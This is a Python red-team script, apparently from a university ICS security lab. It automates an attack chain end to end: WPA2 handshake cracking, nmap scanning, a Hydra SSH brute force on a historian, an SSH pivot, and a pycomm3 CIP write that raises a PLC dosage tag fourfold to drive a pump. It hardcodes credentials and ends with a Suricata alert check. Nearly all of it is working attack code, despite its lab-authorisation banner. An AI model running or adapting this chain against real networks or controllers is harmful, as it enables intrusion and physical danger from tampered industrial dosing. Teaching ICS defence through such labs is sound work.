#!/usr/bin/env python3


import subprocess
import sys
import os
import time
import json
import argparse
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional

# ── Virtual environment bootstrap ────────────────────────────────────────────
# Re-exec inside ~/attack_script/venv if not already running there.
VENV_DIR    = os.path.expanduser("~/attack_script/venv")
VENV_PYTHON = os.path.join(VENV_DIR, "bin", "python3")
VENV_ACTIVATE = os.path.join(VENV_DIR, "bin", "activate")

def _ensure_venv():
    if not os.path.exists(VENV_PYTHON):
        print("[!] venv not found. Run the following to create it:")
        print(f"    python3 -m venv {VENV_DIR}")
        print(f"    source {VENV_ACTIVATE}")
        print("    pip install rich paramiko pycomm3")
        sys.exit(1)
    # If we're not already running inside the venv, re-exec with venv Python
    if os.path.realpath(sys.executable) != os.path.realpath(VENV_PYTHON):
        os.execv(VENV_PYTHON, [VENV_PYTHON] + sys.argv)

_ensure_venv()

# ── Dependency bootstrap (inside venv) ───────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg} into venv...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.prompt import Confirm, Prompt
from rich.progress import Progress
from rich.markup import escape
from rich.text import Text
import paramiko

console = Console()

# ── Static config — edit if your lab topology changes ────────────────────────
CFG = {
    "wifi": {
        "interface":    "wlan0",
        "monitor_iface":"wlan0mon",
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/incs4810_capture",
    },
    "nmap": {
        "idmz_subnet":  "10.10.10.0/24",
        "ports":        "22,80,443,3000,8086,102,44818",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "honeypot": {
        "ip": "10.10.10.50",   # Cowrie — never target directly
    },
    "plc": {
        "ip":           "10.20.20.100",
        "tag":          "Dosage_Rate",
        "safe_value":   8,
        "attack_value": 32,
    },
    "hydra": {
        "wordlist": "/usr/share/wordlists/rockyou.txt",
        "threads":  4,
    },
}

# ── Result tracking ───────────────────────────────────────────────────────────
@dataclass
class PhaseResult:
    phase:   str
    status:  str = "pending"   # pending | success | failed | skipped
    output:  str = ""
    finding: str = ""
    ts:      str = field(default_factory=lambda: datetime.now().isoformat())


results: list[PhaseResult] = []

# ── UI helpers ────────────────────────────────────────────────────────────────

ASCII_BANNER = (
    "██╗  ██╗███████╗███╗   ███╗ ██████╗      ██╗      ██████╗  ██████╗██╗  ██╗\n"
    "██║  ██║██╔════╝████╗ ████║██╔═══██╗     ██║     ██╔═══██╗██╔════╝██║ ██╔╝\n"
    "███████║█████╗  ██╔████╔██║██║   ██║     ██║     ██║   ██║██║     █████╔╝ \n"
    "██╔══██║██╔══╝  ██║╚██╔╝██║██║   ██║     ██║     ██║   ██║██║     ██╔═██╗ \n"
    "██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝     ███████╗╚██████╔╝╚██████╗██║  ██╗\n"
    "╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝      ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n"
    "\n"
    "      █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                    \n"
    "     ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                    \n"
    "     ███████║   ██║      ██║   ███████║██║     █████╔╝                     \n"
    "     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                     \n"
    "     ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                    \n"
    "     ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ V1                 \n"
)

def banner():
    console.print(f"[bold red]{ASCII_BANNER}[/bold red]")
    console.print(Panel(
        "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
        "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
        "[dim]Instructor: Victor Mendez  "
        f"|  venv: {VENV_DIR}[/dim]\n"
        "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
        border_style="red",
        expand=False,
    ))


def phase_header(n: int, title: str):
    console.print()
    console.rule(f"[bold cyan]Phase {n}: {title}[/bold cyan]")


def ok(msg: str):
    console.print(f"[bold green] [+][/bold green] [green]{msg}[/green]")


def warn(msg: str):
    console.print(f"[bold yellow] [!][/bold yellow] [yellow]{msg}[/yellow]")


def err(msg: str):
    console.print(f"[bold red] [-][/bold red] [red]{msg}[/red]")


def info(msg: str):
    console.print(f"[bold blue] [*][/bold blue] [blue]{msg}[/blue]")


def run_cmd(cmd: str, timeout: int = 120, capture: bool = True) -> tuple[int, str]:
    """Run a shell command silently, return (returncode, stdout+stderr)."""
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        if capture:
            console.print(f"[dim]{escape(proc.stdout[-2000:])}[/dim]")
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def stream_cmd(
    cmd: str,
    timeout: int = 300,
    line_filter=None,
    stop_sentinel: str | None = None,
) -> tuple[int, str]:
    """
    Stream a command's output line-by-line with live display.
    line_filter(line) -> rich markup string, or None to use dim default.
    stop_sentinel: kill the process immediately if this string appears in a line
    (used for hydra -f workaround so we don't wait for the process to flush).
    """
    console.print(f"[dim]$ {escape(cmd)}[/dim]")
    lines: list[str] = []
    start = time.monotonic()

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if not line:
                continue
            lines.append(line)
            styled = line_filter(line) if line_filter else f"[dim]{escape(line)}[/dim]"
            console.print(styled)
            if stop_sentinel and stop_sentinel in line:
                proc.terminate()
                break
    except Exception:
        pass
    finally:
        proc.wait()

    elapsed = time.monotonic() - start
    info(f"Finished in {elapsed:.1f}s  (exit {proc.returncode})")
    return proc.returncode, "\n".join(lines)


def _nmap_filter(line: str) -> str:
    lo = line.lower()
    if "nmap scan report" in lo:
        return f"[bold cyan]{escape(line)}[/bold cyan]"
    if "/tcp" in lo and "open" in lo:
        return f"[green]{escape(line)}[/green]"
    if "host is up" in lo:
        return f"[dim green]{escape(line)}[/dim green]"
    return f"[dim]{escape(line)}[/dim]"


def _hydra_filter(line: str) -> str:
    lo = line.lower()
    if "login:" in lo and "password:" in lo:
        return f"[bold green blink]{escape(line)}[/bold green blink]"
    if "error" in lo or "failed" in lo:
        return f"[dim red]{escape(line)}[/dim red]"
    if "attempt" in lo:
        return f"[dim]{escape(line)}[/dim]"
    return f"[dim]{escape(line)}[/dim]"


def ssh_connect(hostname: str, username: str, password: str, port: int = 22) -> paramiko.SSHClient:
    """Open and return an authenticated SSHClient. Raises on failure."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=hostname,
        port=port,
        username=username,
        password=password,
        timeout=15,
    )
    ok(f"SSH connected  {username}@{hostname}:{port}")
    return client


def ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str]:
    """Execute a command on an open SSHClient, return (stdout, stderr)."""
    info(f"remote $ {escape(cmd)}")
    _, stdout_ch, stderr_ch = client.exec_command(cmd, timeout=timeout)
    stdout = stdout_ch.read().decode()
    stderr = stderr_ch.read().decode()
    if stdout.strip():
        console.print(f"[dim]{escape(stdout.strip())}[/dim]")
    if stderr.strip():
        console.print(f"[dim red]{escape(stderr.strip())}[/dim red]")
    return stdout, stderr


def confirm_phase(title: str) -> bool:
    return Confirm.ask(f"\n[yellow]Run[/yellow] [bold]{title}[/bold]?", default=True)


def preflight_check():
    """Verify required system tools are installed before running any phase."""
    tools = ["nmap", "hydra", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
    missing = []
    for tool in tools:
        rc, _ = run_cmd(f"which {tool}", capture=False)
        if rc != 0:
            missing.append(tool)
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt-get install -y nmap hydra aircrack-ng")
        sys.exit(1)
    ok(f"Preflight OK — all tools found: {', '.join(tools)}")


# ── Phase implementations ─────────────────────────────────────────────────────

def phase1_wifi_crack() -> PhaseResult:
    phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
    r = PhaseResult("WiFi Crack")

    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
    cap     = CFG["wifi"]["capture_file"]
    iface   = CFG["wifi"]["interface"]
    mon     = CFG["wifi"]["monitor_iface"]
    wl      = CFG["wifi"]["wordlist"]

    ok("Starting monitor mode...")
    run_cmd("airmon-ng check kill")
    run_cmd(f"airmon-ng start {iface}")

    ok(f"Capturing handshake on ch {channel} (60 s)...")
    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
    run_cmd(
        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
        timeout=75
    )

    ok("Cracking handshake with aircrack-ng...")
    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)

    if "KEY FOUND" in out:
        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
        r.finding = key_lines[0] if key_lines else "KEY FOUND"
        r.status  = "success"
        ok(r.finding)
    else:
        r.status  = "failed"
        r.finding = "Handshake not cracked (try larger wordlist)"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase2_idmz_recon() -> PhaseResult:
    phase_header(2, "IDMZ Recon (nmap)")
    r = PhaseResult("IDMZ Recon")

    subnet = CFG["nmap"]["idmz_subnet"]
    ports  = CFG["nmap"]["ports"]

    # -T4          aggressive timing (parallelise probes)
    # -n           skip DNS resolution
    # -sS          SYN scan (half-open, faster than full connect)
    # --open       only print open ports
    # -sV          version detection
    # --version-intensity 0   grab banner only, no deep probing
    # --min-rate 1000          send at least 1000 packets/sec on LAN
    nmap_cmd = (
        f"nmap -T4 -n -sS --open -sV --version-intensity 0 "
        f"--min-rate 1000 -p {ports} {subnet}"
    )
    info("Fast SYN scan — should complete in ~5–10s on LAN")
    rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)

    historian_found = CFG["historian"]["ip"] in out
    honeypot_found  = CFG["honeypot"]["ip"]  in out

    if historian_found:
        ok(f"Historian found at {CFG['historian']['ip']}")
        r.finding = f"Historian ({CFG['historian']['ip']}) reachable"
        r.status  = "success"
    else:
        warn("Historian not found in scan output — check connectivity")
        r.status  = "failed"
        r.finding = "Historian not reachable"

    if honeypot_found:
        warn(f"[TRAP] Cowrie honeypot at {CFG['honeypot']['ip']} — DO NOT target this host")

    r.output = out[-2000:]
    return r


def phase3_hydra_brute() -> PhaseResult:
    phase_header(3, "SSH Brute Force on Historian (Hydra)")
    r = PhaseResult("Hydra SSH Brute Force")

    ip   = CFG["historian"]["ip"]
    user = CFG["historian"]["username"]
    wl   = CFG["hydra"]["wordlist"]
    t    = CFG["hydra"]["threads"]

    # -e nsr   try empty password, username-as-password, reversed username FIRST
    #          (finds admin/admin or admin/nimda before touching rockyou.txt)
    # -f       stop immediately on first valid credential
    # -t 6     6 parallel SSH threads (sweet spot — avoids SSH rate limits)
    # -V       verbose: print each attempt so we see live progress
    hydra_cmd = f"hydra -l {user} -e nsr -P {wl} -t 6 -f -V {ip} ssh"

    info(f"Trying quick credential variations first (-e nsr), then wordlist")
    info(f"Will stop the moment a hit is found (-f)")

    rc, out = stream_cmd(
        hydra_cmd,
        timeout=300,
        line_filter=_hydra_filter,
        stop_sentinel="[32][ssh]",   # hydra success line prefix
    )

    cred_lines = [l for l in out.splitlines() if "login:" in l and "password:" in l]
    if cred_lines:
        r.finding = cred_lines[0]
        r.status  = "success"
        ok(f"Credentials found: {r.finding}")
    else:
        r.status  = "failed"
        r.finding = "No credentials found with given wordlist"
        err(r.finding)

    r.output = out[-1000:]
    return r


def phase4_ssh_pivot() -> PhaseResult:
    phase_header(4, "SSH into Historian — Lateral Movement Recon")
    r = PhaseResult("SSH Pivot / OT Recon")

    ip       = CFG["historian"]["ip"]
    username = CFG["historian"]["username"]
    password = CFG["historian"]["password"]
    port     = CFG["historian"]["port"]

    try:
        client = ssh_connect(hostname=ip, username=username, password=password, port=port)

        commands = {
            "OT syslog (last 20 lines)": "grep '10.20.20' /var/log/syslog | tail -20",
            "Routes to OT zone":         "ip route | grep 10.20",
            "Ping PLC":                  f"ping -c 3 {CFG['plc']['ip']}",
        }

        findings = []
        for label, cmd in commands.items():
            console.print(f"\n[bold cyan]{label}[/bold cyan]")
            stdout, stderr = ssh_run(client, cmd)
            findings.append(f"{label}:\n{stdout}")

        r.finding = f"OT zone route confirmed; PLC {CFG['plc']['ip']} reachable"
        r.status  = "success"
        r.output  = "\n".join(findings)
        client.close()

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {username}@{ip} — update CFG credentials"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase5_plc_attack() -> PhaseResult:
    phase_header(5, "CIP Write Tag — PLC Dosage_Rate Manipulation")
    r = PhaseResult("PLC CIP Write")

    plc_ip   = CFG["plc"]["ip"]
    tag      = CFG["plc"]["tag"]
    safe_val = CFG["plc"]["safe_value"]
    atk_val  = CFG["plc"]["attack_value"]

    hist_ip       = CFG["historian"]["ip"]
    hist_port     = CFG["historian"]["port"]
    hist_username = CFG["historian"]["username"]
    hist_password = CFG["historian"]["password"]

    warn(f"This will write {tag} = {atk_val} (simulated 4x overdose) on PLC {plc_ip}")
    warn("MasterFlex pump will physically change behavior.")

    if not Confirm.ask("[red]Confirm attack write?[/red]", default=False):
        r.status  = "skipped"
        r.finding = "Skipped by operator"
        return r

    # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
    # source the venv first so pycomm3 is available on the remote host.
    payload = (
        f"source {VENV_ACTIVATE} && python3 - <<'PYEOF'\n"
        f"from pycomm3 import LogixDriver\n"
        f"with LogixDriver('{plc_ip}') as plc:\n"
        f"    cur = plc.read('{tag}')\n"
        f"    print('Before:', cur.value)\n"
        f"    plc.write(('{tag}', {atk_val}))\n"
        f"    after = plc.read('{tag}')\n"
        f"    print('After:', after.value)\n"
        f"PYEOF"
    )

    try:
        client = ssh_connect(
            hostname=hist_ip,
            username=hist_username,
            password=hist_password,
            port=hist_port,
        )
        ok(f"Sending CIP Write via Historian ({hist_ip}) → PLC ({plc_ip})")
        stdout, stderr = ssh_run(client, payload, timeout=30)
        client.close()

        if f"After: {atk_val}" in stdout:
            r.status  = "success"
            r.finding = f"{tag} written: {safe_val} → {atk_val} (4x overdose simulated)"
            ok(r.finding)
        elif "Error" in stderr or "Traceback" in stderr:
            r.status  = "failed"
            r.finding = stderr[:300]
            err(r.finding)
        else:
            r.status  = "success"
            r.finding = f"CIP Write sent — verify tag value on PLC / Grafana"
            warn(r.finding)

        r.output = stdout + stderr

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {hist_username}@{hist_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


def phase6_defense_check() -> PhaseResult:
    phase_header(6, "Defense Validation (Secure State)")
    r = PhaseResult("Defense Validation")

    ids_ip       = "10.20.20.5"
    ids_username = CFG["historian"]["username"]
    ids_password = CFG["historian"]["password"]
    ids_port     = CFG["historian"]["port"]
    ids_cmd      = "tail -50 /var/log/suricata/fast.log | grep -i 'cip\\|write\\|plc'"

    info(f"Checking Suricata alerts on IDS ({ids_ip})...")

    try:
        client = ssh_connect(
            hostname=ids_ip,
            username=ids_username,
            password=ids_password,
            port=ids_port,
        )
        stdout, _ = ssh_run(client, ids_cmd)
        client.close()

        if stdout.strip():
            ok("Suricata CIP alert triggered:")
            console.print(f"[yellow]{escape(stdout)}[/yellow]")
            r.finding = "Suricata blocked CIP Write — Layer 1 defense confirmed"
            r.status  = "success"
        else:
            warn("No Suricata CIP alerts found — check rule deployment")
            r.finding = "No Suricata alerts detected"
            r.status  = "success"

        r.output = stdout

    except paramiko.AuthenticationException:
        r.status  = "failed"
        r.finding = f"SSH auth failed for {ids_username}@{ids_ip}"
        err(r.finding)
    except Exception as e:
        r.status  = "failed"
        r.finding = str(e)
        err(str(e))

    return r


# ── Final report ──────────────────────────────────────────────────────────────

def print_report():
    console.print()
    console.rule("[bold white]Attack Chain Report[/bold white]")

    STATUS_STYLE = {
        "success": ("green",  " SUCCESS"),
        "failed":  ("red",    " FAILED "),
        "skipped": ("yellow", " SKIPPED"),
        "pending": ("dim",    " PENDING"),
    }

    table = Table(show_header=True, header_style="bold magenta", border_style="dim")
    table.add_column("#",       style="dim",   width=3)
    table.add_column("Phase",   style="cyan",  width=26)
    table.add_column("Status",  width=10)
    table.add_column("Finding", width=54)

    for i, r in enumerate(results, 1):
        color, label = STATUS_STYLE.get(r.status, ("white", r.status.upper()))
        table.add_row(
            str(i),
            r.phase,
            f"[bold {color}]{label}[/bold {color}]",
            r.finding,
        )

    console.print(table)

    report_path = f"/tmp/incs4810_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = [
        {"phase": r.phase, "status": r.status,
         "finding": r.finding, "ts": r.ts, "output": r.output}
        for r in results
    ]
    with open(report_path, "w") as f:
        json.dump(data, f, indent=2)

    ok(f"Full JSON report saved: {report_path}")


# ── Phase registry ────────────────────────────────────────────────────────────

PHASES = [
    (1, "WiFi AP Crack",         phase1_wifi_crack),
    (2, "IDMZ Recon",            phase2_idmz_recon),
    (3, "SSH Brute Force",       phase3_hydra_brute),
    (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
    (5, "PLC CIP Write Attack",  phase5_plc_attack),
    (6, "Defense Validation",    phase6_defense_check),
]


# ── Entry point ───────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="INCS 4810 Red Team Chain — BCIT Authorized Lab"
    )
    parser.add_argument(
        "--phases", nargs="*", type=int,
        help="Run specific phases only, e.g. --phases 2 3 4"
    )
    parser.add_argument(
        "--auto", action="store_true",
        help="Skip per-phase confirmation prompts"
    )
    args = parser.parse_args()

    banner()
    preflight_check()

    selected   = set(args.phases) if args.phases else {n for n, _, _ in PHASES}
    chain_start = time.monotonic()

    for n, title, fn in PHASES:
        if n not in selected:
            results.append(PhaseResult(title, status="skipped", finding="Not selected"))
            continue

        if not args.auto and not confirm_phase(f"Phase {n}/{len(PHASES)}: {title}"):
            results.append(PhaseResult(title, status="skipped", finding="Skipped by operator"))
            continue

        phase_start = time.monotonic()
        r = fn()
        phase_elapsed = time.monotonic() - phase_start
        results.append(r)

        # Per-phase elapsed time — always shown, no fake progress bar
        status_color = "green" if r.status == "success" else "red" if r.status == "failed" else "yellow"
        console.print(
            f"\n[dim]Phase {n} complete — "
            f"[{status_color}]{r.status.upper()}[/{status_color}]  "
            f"elapsed [bold]{phase_elapsed:.1f}s[/bold][/dim]"
        )

        if r.status == "failed" and not args.auto:
            if not Confirm.ask("[red]Phase failed — continue?[/red]", default=True):
                break

    chain_elapsed = time.monotonic() - chain_start
    console.print(f"\n[dim]Total chain elapsed: [bold]{chain_elapsed:.1f}s[/bold][/dim]")
    print_report()


if __name__ == "__main__":
    main()
